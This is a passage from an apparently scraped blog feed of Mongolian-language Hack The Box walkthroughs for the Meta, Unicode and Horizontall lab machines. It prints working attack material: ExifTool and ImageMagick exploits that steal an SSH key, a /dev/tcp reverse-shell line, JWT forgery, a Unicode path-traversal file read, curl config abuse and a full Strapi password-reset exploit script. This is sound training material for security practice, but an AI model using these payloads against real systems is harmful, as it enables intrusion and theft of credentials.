Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA) | 256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA) |_ 256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Did not follow redirect to http://artcorp.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.09 seconds /etc/hosts-д artcorp.htb нэмж оруулна.\n3. Gobuster gobuster dir -u http://artcorp.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt Result:\nGobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://artcorp.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/01/30 04:38:58 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 234] [--\u0026gt; http://artcorp.htb/assets/] /css (Status: 301) [Size: 231] [--\u0026gt; http://artcorp.htb/css/] V-host:\ngobuster vhost -u http://artcorp.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://artcorp.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/01/30 04:45:39 Starting gobuster in VHOST enumeration mode =============================================================== Found: dev01.artcorp.htb (Status: 200) [Size: 247] dev01.artcorp.htb -г etc/hosts дотор нэмлээ. 4. CVE-2021-22204 http://dev01.artcorp.htb/metaview/ зураг upload хийвэл:\nFile Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Resolution Unit : None X Resolution : 1 Y Resolution : 1 Image Width : 275 Image Height : 183 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) exiftool - cve ашиглаж exploit хийж www руу хандах:\ngit clone https://github.com/convisolabs/CVE-2021-22204-exiftool дотор байгаа exploit.py ip, port өөрийн хаягаар сольж бичээд python3 exploit.py ажилуулаад шинээр generate хийсэн image.jpg-г upload хийнэ. Өмнө нь nc -lvnp 9001 порт асаагаад listen хийнэ.\nShell balancing python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орох үед:\nexport TERM=xterm /etc/passwd:\n# The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters bash-5.0$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin thomas нэртэй user байгаад харж болж байна.\n5. Exploitation pspy64s:\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s Web server асаах:\nmkdir www mv pspy64s www python3 -m http.server www:\ncd /tmp wget 10.10.14.90:8000/pspy64s chmod +x pspy64s ./pspy64s /usr/local/bin/convert_images.sh\n2022/01/30 07:37:01 CMD: UID=1000 PID=26258 | /bin/bash /usr/local/bin/convert_images.sh 2022/01/30 07:37:01 CMD: UID=1000 PID=26259 | /usr/local/bin/mogrify -format png *.* 2022/01/30 07:37:01 CMD: UID=1000 PID=26260 | pkill mogrify /use/local/bin/convet_images.sh:\n#!/bin/bash cd /var/www/dev01.artcorp.htb/convert_images/ \u0026amp;\u0026amp; /usr/local/bin/mogrify -format png *.* 2\u0026gt;/dev/null pkill mogrify poc.svg: /tmp дотор touch хийгээд save хийнэ.\n\u0026lt;image authenticate=\u0026#39;ff\u0026#34; `echo $(cat ~/.ssh/id_rsa)\u0026gt; /dev/shm/key`;\u0026#34;\u0026#39;\u0026gt; \u0026lt;read filename=\u0026#34;pdf:/etc/passwd\u0026#34;/\u0026gt; \u0026lt;get width=\u0026#34;base-width\u0026#34; height=\u0026#34;base-height\u0026#34; /\u0026gt; \u0026lt;resize geometry=\u0026#34;400x400\u0026#34; /\u0026gt; \u0026lt;write filename=\u0026#34;test.png\u0026#34; /\u0026gt; \u0026lt;svg width=\u0026#34;700\u0026#34; height=\u0026#34;700\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34;\u0026gt; \u0026lt;image xlink:href=\u0026#34;msl:poc.svg\u0026#34; height=\u0026#34;100\u0026#34; width=\u0026#34;100\u0026#34;/\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/image\u0026gt; доор байгаа path руу хуулаад cron ажиллах хүртэл хүлээнэ.\ncp /tmp/poc.svg /var/www/dev01.artcorp.htb/convert_images/ /dev/shm дотор key нэртэй id_rsa үүссэн байгаа. wget юм уу cat хийж байгаад id_rsa хуулаад форматад оруулаад\nmv key id_rsa chmod 600 id_rsa ssh -i id_rsa thomas@10.10.11.140 user.txt:\n1675c9******* 6. Enumeration sudo -l thomas-с хэрэглэж болох зүйл:\nMatching Defaults entries for thomas on meta: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOME User thomas may run the following commands on meta: (root) NOPASSWD: /usr/bin/neofetch \\\u0026#34;\\\u0026#34; /usr/bin/neofetch:\n_,met$$$$$gg. root@meta ,g$$$$$$$$$$$$$$$P. --------- ,g$$P\u0026#34; \u0026#34;\u0026#34;\u0026#34;Y$$.\u0026#34;. OS: Debian GNU/Linux 10 (buster) x86_64 ,$$P\u0026#39; `$$$. Host: VMware Virtual Platform None \u0026#39;,$$P ,ggs. `$$b: Kernel: 4.19.0-17-amd64 `d$$\u0026#39; ,$P\u0026#34;\u0026#39; . $$$ Uptime: 4 hours, 41 mins $$P d$\u0026#39; , $$P Packages: 495 (dpkg) $$: $$. - ,d$$\u0026#39; Shell: bash 5.0.3 $$; Y$b._ _,d$P\u0026#39; CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz Y$$. `.`\u0026#34;Y$$$$P\u0026#34;\u0026#39; GPU: VMware SVGA II Adapter `$$b \u0026#34;-.__ Memory: 151MiB / 1994MiB `Y$$ `Y$$. `$$b. `Y$$b. `\u0026#34;Y$b._ `\u0026#34;\u0026#34;\u0026#34; /home/thomas/.config/neofetch:\nvi config.conf # add bash \u0026amp;\u0026gt;/dev/tcp/10.10.14.90/9000 \u0026lt;\u0026amp;1 # 9001 порт сонсоно nc -lvnp 9001 # machine vm export XDG_CONFIG_HOME=/home/thomas/.config root.txt:\nf44aa**** ","permalink":"https://cadil.github.io/posts/2024-02-27-htb-meta-writeup/","summary":"1. IP Address # Machine Address 10.10.11.140 # Local Address 10.10.14.90 2. Nmap nmap -sC -sV -oA nmap/meta 10.10.11.140 Result:\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-30 04:32 EST Nmap scan report for 10.10.11.140 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA) | 256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA) |_ 256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Did not follow redirect to http://artcorp.","title":"HTB - Meta"},{"content":"1. IP Address # Machine Address 10.10.11.126 # Local Address 10.10.14.62 2. Nmap nmap -sV -sC -oA nmap/unicode 10.10.11.126 Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-16 02:10 EST Nmap scan report for 10.10.11.126 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA) | 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA) |_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-generator: Hugo 0.83.1 |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Hackmedia Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.41 seconds 1.2 hosts нэмэх ect/hosts рүү:\n10.10.11.126 hackmedia.htb 3. ffuf ffuf -u http://FUZZ.hackmedia.htb -w /opt/SecLists/Discovery/DNS/dns-Jhaddix.txt -o ffuf/Jhaddix.out ffuf -u http://hackmedia.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -c -fs 9294 -t 100 4. JWT Regsiter хийгээд burp шалгах:\nPOST /login/ HTTP/1.1 Host: hackmedia.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 29 Origin: http://hackmedia.htb DNT: 1 Connection: close Referer: http://hackmedia.htb/login/ Upgrade-Insecure-Requests: 1 Sec-GPC: 1 username=ca4mi\u0026amp;password=ca4mi sign in хийгээд орвол:\nGET /dashboard/ HTTP/1.1 Host: hackmedia.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://hackmedia.htb/login/ DNT: 1 Connection: close Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiY2E0bWkifQ.nT3ZR5zm6FIbC-0jPxWfJScEYQ_S3WnScSZxZG6G9m4XmUIBeiNdU5ZFt-hrmSUGlVboD2L8ugv_Scs-d-OllwI931tITfKLFOf50T9_3JdKlxkd1ll5QXh_S4SfIf0KPZbRD1ORBxn-DSySPOr0Mg1hdnd4kAQjOOSczNg9J03BqxTeHzfXsWZdM861iQfF4NLQ8FupMNyeMM4wBFGxPKTb_RSmse_Nw7HgkRz83cOsiQBNCnW-1bdX_KL_oV33FuAjnnYTrTTAfVcVb2PZ2REZW36AWpPJTD8WDhwEp_FIQYZMcOB4ivBQf_5PJIqBjG2Q7gCGG1uB1w305Zp0YA Upgrade-Insecure-Requests: 1 Sec-GPC: 1 flask-unsign command:\npip3 install flask-unsign decode хийнэ: https://book.hacktricks.xyz/pentesting/pentesting-web/flask\nlask-unsign -c eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiY2E0bWkifQ.nT3ZR5zm6FIbC-0jPxWfJScEYQ_S3WnScSZxZG6G9m4XmUIBeiNdU5ZFt-hrmSUGlVboD2L8ugv_Scs-d-OllwI931tITfKLFOf50T9_3JdKlxkd1ll5QXh_S4SfIf0KPZbRD1ORBxn-DSySPOr0Mg1hdnd4kAQjOOSczNg9J03BqxTeHzfXsWZdM861iQfF4NLQ8FupMNyeMM4wBFGxPKTb_RSmse_Nw7HgkRz83cOsiQBNCnW-1bdX_KL_oV33FuAjnnYTrTTAfVcVb2PZ2REZW36AWpPJTD8WDhwEp_FIQYZMcOB4ivBQf_5PJIqBjG2Q7gCGG1uB1w305Zp0YA -d үр дүнд:\n{\u0026#39;typ\u0026#39;: \u0026#39;JWT\u0026#39;, \u0026#39;alg\u0026#39;: \u0026#39;RS256\u0026#39;, \u0026#39;jku\u0026#39;: \u0026#39;http://hackmedia.htb/static/jwks.json\u0026#39;} static/jwks.json jwks:\n{ \u0026#34;keys\u0026#34;: [ { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;use\u0026#34;: \u0026#34;sig\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;hackthebox\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;RS256\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34; } ] } JSON Web Key Set (JWKS) A JSON object that represents a set of JWKs. The JSON object MUST have a keys member, which is an array of JWKs.\n[6.3.1.1](https://datatracker.ietf.org/doc/html/rfc7518#section-6.3.1.1). \u0026#34;n\u0026#34; (Modulus) Parameter The \u0026#34;n\u0026#34; (modulus) parameter contains the modulus value for the RSA public key. It is represented as a Base64urlUInt-encoded value. Note that implementers have found that some cryptographic libraries prefix an extra zero-valued octet to the modulus representations they return, for instance, returning 257 octets for a 2048-bit key, rather than 256. Implementations using such libraries will need to take care to omit the extra octet from the base64url-encoded representation. [6.3.1.2](https://datatracker.ietf.org/doc/html/rfc7518#section-6.3.1.2). \u0026#34;e\u0026#34; (Exponent) Parameter The \u0026#34;e\u0026#34; (exponent) parameter contains the exponent value for the RSA public key. It is represented as a Base64urlUInt-encoded value. For instance, when representing the value 65537, the octet sequence to be base64url-encoded MUST consist of the three octets [1, 0, 1]; the resulting representation for this value is \u0026#34;AQAB\u0026#34;. https://mkjwk.org - random key set generate хийнэ. Public Key хэсгийн \u0026ldquo;n\u0026rdquo;, Public key, Private key pem-үүдыг хуулан ашиглана.\nhttp://jwt.io дотор шинэ хэрэглэгч~н cookie -г RS256 -р сонгоод:\nrole: admin, jku: http://hackmedia.htb/static/../redirect/?url=\u0026lt;local_ip:8000/jwks.json\u0026gt; https://mkjwk.org -с авсан Public болoн Private key pem-д доор байгаа харгалзах талбарт нь хуулна.\nLocal сервер асаагаад\npython -m http.server http:hackmedia.htb руу sign-in хийж ороод http://jwt.io -с tтохируулсан cookie-ээр солино.\n10.10.11.126 - - [29/Dec/2021 01:31:21] \u0026#34;GET /jwks.json HTTP/1.1\u0026#34; 200 - 5. LFI filter /display/?page=XXXX GET /display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false code:x:1000:1000:,,,:/home/code:/bin/bash user-г хэн болохыг шалгаж байна:\nGET /display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/proc/self/environ LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LOGNAME=codeUSER=codeSHELL=/bin/bash INVOCATION_ID=b2a1c9ff17bd49e2bf01d83a1cf7ce1b USER: code user.txt ингэж авч болж байна\nGET /display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/user.txt user.txt\n743e4e********* SSH key авах гээд үзэхээр болохгүй байна. Machine reset хийж үзээд дахиад хандаад үзэх санаатай байна:\nGET /display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/.ssh/id_rsa болсонгүй.\n/etc/nginx/sites-enabled/default limit_req_zone $binary_remote_addr zone=mylimit:10m rate=800r/s; server{ #Change the Webroot from /home/code/app/ to /var/www/html/ #change the user password from db.yaml listen 80; error_page 503 /rate-limited/; location / { limit_req zone=mylimit; proxy_pass http://localhost:8000; include /etc/nginx/proxy_params; proxy_redirect off; } location /static/{ alias /home/code/coder/static/styles/; } } GET /display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/coder/db.yaml mysql_host: \u0026#34;localhost\u0026#34; mysql_user: \u0026#34;code\u0026#34; mysql_password: \u0026#34;B3stC0d3r2021@@!\u0026#34; mysql_db: \u0026#34;user\u0026#34; ssh-r хандах:\nssh code@10.10.11.126 sudo -l:\nUser code may run the following commands on code: (root) NOPASSWD: /usr/bin/treport 6. Privilege Escalation tool: https://github.com/diego-treitos/linux-smart-enumeration\npython3 -m http.server wget 10.10.14.5:800/lse.sh chmod +x lse.sh ./lse.sh sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:{-K,/root/root.txt} Warning: /root/root.txt:1: warning: \u0026#39;517*****************\u0026#39; is Warning: unknown curl: no URL specified! root.txt:\n517***************** ","permalink":"https://cadil.github.io/posts/2024-02-25-htb-unicode-writeup/","summary":"1. IP Address # Machine Address 10.10.11.126 # Local Address 10.10.14.62 2. Nmap nmap -sV -sC -oA nmap/unicode 10.10.11.126 Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-16 02:10 EST Nmap scan report for 10.10.11.126 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA) | 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA) |_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519) 80/tcp open http nginx 1.","title":"HTB - Unicode"},{"content":"1. IP Address # Machine Address 10.10.11.105 # Local Address 10.10.14.139 horizontall.htb -\u0026gt; etc/chosts\n2. Nmap nmap -sV -sC -oA nmap/horizontall 10.10.11.105 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-11 02:22 EST Nmap scan report for 10.10.11.105 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Did not follow redirect to http://horizontall.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.48 second 22 SSH 90 TCP\n3. Gobuster gobuster dir -u http://horizontall.htb/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://horizontall.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/11/11 02:40:58 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/img/] /css (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/css/] /js (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/js/] Progress: 15257 / 220561 (6.92%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/11/11 02:47:09 Finished =============================================================== path олдоогүй.\nfuff хийж болно гэхдээ өөр лист бас ашиглаж болно.\ngobuster vhost dir -u http://horizontall.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt энэ удах шинжтэй давхар fuff уншуулав.\nffuf -w /opt/SecLists/Discovery/DNS/shubs-subdomains.txt -u http://horizontall.htb -H \u0026#34;Host: FUZZ.horizontall.htb\u0026#34; -t 200 -fl 10 Дээрк түрүүлж дууссан. 302 буцаасан олон лист байсан. Удаан ч gobuster -аа хүлээсэн.\nGobuster Out:\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://horizontall.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/11/11 03:24:05 Starting gobuster in VHOST enumeration mode =============================================================== Found: api-prod.horizontall.htb (Status: 200) [Size: 413] Progress: 49562 / 114442 (43.31%) ^C [!] Keyboard interrupt detected, terminating. api-prod.horizontall.htb -\u0026gt; etc/hosts\nhttp://api-prod.horizontall.htb/admin/auth/login\n4. CVE-2019-18818 https://thatsn0tmysite.wordpress.com/2019/11/15/x05/ https://github.com/offensive-security/exploitdb/blob/master/exploits/multiple/webapps/50237.py wget:\n# Exploit Title: Strapi 3.0.0-beta - Set Password (Unauthenticated) # Date: 2021-08-29 # Exploit Author: David Anglada [CodiObert] # Vendor Homepage: https://strapi.io/ # Version: 3.0.0-beta # Tested on: Linux # CVE: CVE-2019-18818 #!/usr/bin/python import requests import sys import json userEmail = \u0026#34;valid@email.com\u0026#34; strapiUrl = \u0026#34;http://strapi.url\u0026#34; newPassword = \u0026#34;codiobert\u0026#34; s = requests.Session() # Get strapi version strapiVersion = json.loads(s.get(\u0026#34;{}/admin/strapiVersion\u0026#34;.format(strapiUrl)).text) print(\u0026#34;[*] strapi version: {}\u0026#34;.format(strapiVersion[\u0026#34;strapiVersion\u0026#34;])) # Validate vulnerable version if strapiVersion[\u0026#34;strapiVersion\u0026#34;].startswith(\u0026#39;3.0.0-beta\u0026#39;) or strapiVersion[\u0026#34;strapiVersion\u0026#34;].startswith(\u0026#39;3.0.0-alpha\u0026#39;): # Password reset print(\u0026#34;[*] Password reset for user: {}\u0026#34;.format(userEmail)) resetPasswordReq={\u0026#34;email\u0026#34;:userEmail, \u0026#34;url\u0026#34;:\u0026#34;{}/admin/plugins/users-permissions/auth/reset-password\u0026#34;.format(strapiUrl)} s.post(\u0026#34;{}/\u0026#34;.format(strapiUrl), json=resetPasswordReq) # Set new password print(\u0026#34;[*] Setting new password\u0026#34;) exploit={\u0026#34;code\u0026#34;:{}, \u0026#34;password\u0026#34;:newPassword, \u0026#34;passwordConfirmation\u0026#34;:newPassword} r=s.post(\u0026#34;{}/admin/auth/reset-password\u0026#34;.format(strapiUrl), json=exploit) # Check if the password has changed if \u0026#34;username\u0026#34; in str(r.content): print(\u0026#34;[+] New password \u0026#39;{}\u0026#39; set for user {}\u0026#34;.format(newPassword, userEmail)) else: print(\u0026#34;\\033[91m[-] Something went wrong\\033[0m\u0026#34;) sys.exit(1) else: print(\u0026#34;\\033[91m[-] This version is not vulnerable\\033[0m\u0026#34;) sys.exit(1) Дээрх болоолгүй.\nДахин:\nimport requests import sys import json args=sys.argv if len(args) \u0026lt; 4: print(\u0026#34;Usage: {} \u0026lt;admin_email\u0026gt; \u0026lt;url\u0026gt; \u0026lt;new_password\u0026gt;\u0026#34;.format(args[0])) exit(-1) email = args[1] url = args[2] new_password = args[3] s = requests.Session() version = json.loads(s.get(\u0026#34;{}/admin/strapiVersion\u0026#34;.format(url)).text) print(\u0026#34;[*] Detected version(GET /admin/strapiVersion): {}\u0026#34;.format(version[\u0026#34;strapiVersion\u0026#34;])) #Request password reset print(\u0026#34;[*] Sending password reset request...\u0026#34;) reset_request={\u0026#34;email\u0026#34;:email, \u0026#34;url\u0026#34;:\u0026#34;{}/admin/plugins/users-permissions/auth/reset-password\u0026#34;.format(url)} s.post(\u0026#34;{}/\u0026#34;.format(url), json=reset_request) #Reset password to print(\u0026#34;[*] Setting new password...\u0026#34;) exploit={\u0026#34;code\u0026#34;:{}, \u0026#34;password\u0026#34;:new_password, \u0026#34;passwordConfirmation\u0026#34;:new_password} r=s.post(\u0026#34;{}/admin/auth/reset-password\u0026#34;.format(url), json=exploit) print(\u0026#34;[*] Response:\u0026#34;) print(str(r.content)) CLI:\npython3 meth2.py admin@horizontall.htb http://api-prod.horizontall.htb 123456 Result:\npython3 meth2.py admin@horizontall.htb http://api-prod.horizontall.htb 123456 [*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4 [*] Sending password reset request... [*] Setting new password... [*] Response: 